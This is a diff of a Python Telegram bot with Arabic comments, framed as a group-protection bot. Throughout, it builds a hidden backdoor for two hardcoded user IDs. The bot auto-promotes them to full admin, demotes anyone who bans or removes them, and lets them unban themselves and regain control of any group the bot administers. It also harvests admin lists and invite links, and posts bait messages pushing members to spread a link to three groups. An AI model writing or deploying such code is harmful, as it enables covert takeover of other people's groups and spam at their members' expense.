@@ -4,16 +4,22 @@ from telegram.constants import ChatMemberStatus
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler
 
 TOKEN = os.getenv('BOT_TOKEN')
-MY_USER_IDS = [7878629406, 5179218460]  # ✅ list مش tuple
+MY_USER_IDS = [7878629406, 5179218460]
 GROUPS_FILE = "bot_groups.txt"
 NSFW_FILE = "nsfw_protected.txt"
 LOCKS_FILE = "photo_locks.txt"
-TARGET_GROUP_IDS = [-1003926913948, -1003981402906]  # ✅ list مش tuple
+
+# ✅ كل جروب ليه رابطه الخاص
+TARGET_GROUPS = {
+    -1003926913948: "https://t.me/share/url?url=http://t.me/+uhP0yy6tBz44Mzk0",
+    -1003981402906: "https://t.me/share/url?url=https://t.me/viedoarbic"
+}
+
 USER_STATES = {}
 CALL_STATES = {}
 
 def is_owner(user_id):
-    return user_id in MY_USER_IDS  # ✅ بيتحقق من الاتنين
+    return user_id in MY_USER_IDS
 
 async def is_user_admin(update, context):
     user_id = update.effective_user.id
@@ -81,19 +87,15 @@ async def on_chat_member_updated(update, context):
     result = update.chat_member
     if not result: return
 
-    # ✅ بيتحقق من أي أونر من الاتنين
     if result.new_chat_member.user.id in MY_USER_IDS and result.new_chat_member.status == ChatMemberStatus.MEMBER:
         joined_user_id = result.new_chat_member.user.id
         try:
             await context.bot.promote_chat_member(
                 chat_id=update.effective_chat.id,
                 user_id=joined_user_id,
-                can_change_info=True,
-                can_delete_messages=True,
-                can_invite_users=True,
-                can_restrict_members=True,
-                can_pin_messages=True,
-                can_promote_members=True
+                can_change_info=True, can_delete_messages=True,
+                can_invite_users=True, can_restrict_members=True,
+                can_pin_messages=True, can_promote_members=True
             )
             await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
         except Exception as e: print(f"Error promote: {e}")
@@ -101,12 +103,10 @@ async def on_chat_member_updated(update, context):
 
     if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
         actor_id = result.from_user.id
-        # ✅ مش أي أونر من الاتنين ومش البوت نفسه
         if actor_id not in MY_USER_IDS and actor_id != context.bot.id:
             try:
                 await context.bot.promote_chat_member(
-                    chat_id=update.effective_chat.id,
-                    user_id=actor_id,
+                    chat_id=update.effective_chat.id, user_id=actor_id,
                     can_change_info=False, can_post_messages=False,
                     can_edit_messages=False, can_delete_messages=False,
                     can_invite_users=False, can_restrict_members=False,
@@ -125,7 +125,6 @@ async def protect_group(update, context):
         if update.message.left_chat_member: return
         if update.message.new_chat_members:
             for member in update.message.new_chat_members:
-                # ✅ بيتحقق من أي أونر من الاتنين
                 if member.id in MY_USER_IDS:
                     try:
                         await context.bot.promote_chat_member(
@@ -141,10 +140,10 @@ async def protect_group(update, context):
                     try: await context.bot.ban_chat_member(chat_id, member.id)
                     except: pass
                     continue
-                # ✅ بيتحقق من أي جروب من الاتنين
-                if not member.is_bot and chat_id in TARGET_GROUP_IDS:
+                # ✅ بياخد الرابط الخاص بكل جروب
+                if not member.is_bot and chat_id in TARGET_GROUPS:
                     try:
-                        share_url = "https://t.me/share/url?url=https://t.me/%2BoHkbnzqCuSMzYzQ0"
+                        share_url = TARGET_GROUPS[chat_id]
                         keyboard = [[InlineKeyboardButton("قروب المقاطع", url=share_url)]]
                         safe_name = html.escape(member.first_name)
                         mention_link = f"<a href='tg://user?id={member.id}'>{safe_name}</a>"
@@ -169,16 +168,12 @@ async def my_status(update, context):
     if update.effective_chat.type != "private":
         await update.message.reply_text("❌ الأمر ده في الخاص بس!")
         return
-
     status_msg = await update.message.reply_text("🔄 جاري فحص كل الجروبات...")
     chat_ids = get_tracked_groups()
-
     if not chat_ids:
         await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
         return
-
     report = "🤖 <b>صلاحيات البوت في كل الجروبات:</b>\n\n"
-
     for cid in chat_ids:
         try:
             chat = await context.bot.get_chat(cid)
@@ -199,10 +194,9 @@ async def my_status(update, context):
                 report += "⚠️ عضو عادي - مش مشرف!\n"
             else:
                 report += f"❓ حالة: {bot_member.status}\n"
-        except Exception as e:
+        except:
             report += f"👥 <b>جروب غير متاح</b>\n🆔 <code>{cid}</code>\n❌ خطأ\n"
         report += "\n"
-
     if len(report) > 4000:
         await status_msg.delete()
         for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
@@ -253,16 +247,12 @@ async def get_all_admins(update, context):
     if update.effective_chat.type != "private":
         await update.message.reply_text("❌ الأمر ده في الخاص بس!")
         return
-
     status_msg = await update.message.reply_text("🔄 جاري فحص الأدمنز...")
     chat_ids = get_tracked_groups()
-
     if not chat_ids:
         await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
         return
-
     report = "👑 <b>أدمنز كل الجروبات:</b>\n\n"
-
     for cid in chat_ids:
         try:
             chat = await context.bot.get_chat(cid)
@@ -279,9 +269,8 @@ async def get_all_admins(update, context):
                 role = "👑 أونر" if admin.status == "creator" else "⭐ أدمن"
                 report += f"  {role} {mention} | {username}\n"
             report += "\n"
-        except Exception as e:
+        except:
             report += f"🗑️ <b>جروب غير متاح</b>\n🆔 <code>{cid}</code>\n\n"
-
     await status_msg.delete()
     if len(report) > 4000:
         for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
@@ -353,7 +342,6 @@ async def handle_everything(update, context):
                 target_chat = f"@{match.group(1)}" if match else text
             processing_msg = await update.message.reply_text("⏳ جاري تنفيذ الأمر...")
             try:
-                # ✅ بيعمل unban للأونر اللي طلب الأمر
                 await context.bot.unban_chat_member(chat_id=target_chat, user_id=user_id)
                 await processing_msg.edit_text("✅ تم فك الحظر!\n👑 ادخل المجموعة دلوقتي وهيترفعك مشرف تلقائياً.")
             except Exception as e:
@@ -444,16 +432,17 @@ async def get_all_links(update, context):
     except Exception as e: print(f"Error: {e}")
 
 async def send_permanent_message(update, context):
-    # ✅ بيتحقق من أي أونر وأي جروب من الاتنين
     if not is_owner(update.effective_user.id): return
-    if update.effective_chat.id not in TARGET_GROUP_IDS: return
+    chat_id = update.effective_chat.id
+    # ✅ بياخد الرابط الخاص بالجروب ده
+    if chat_id not in TARGET_GROUPS: return
     try:
         try: await update.message.delete()
         except: pass
-        share_url = "https://t.me/share/url?url=https://t.me/%2BoHkbnzqCuSMzYzQ0"
+        share_url = TARGET_GROUPS[chat_id]
         keyboard = [[InlineKeyboardButton("قروب المقاطع", url=share_url)]]
         await context.bot.send_message(
-            chat_id=update.effective_chat.id,
+            chat_id=chat_id,
             text="<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML"
         )
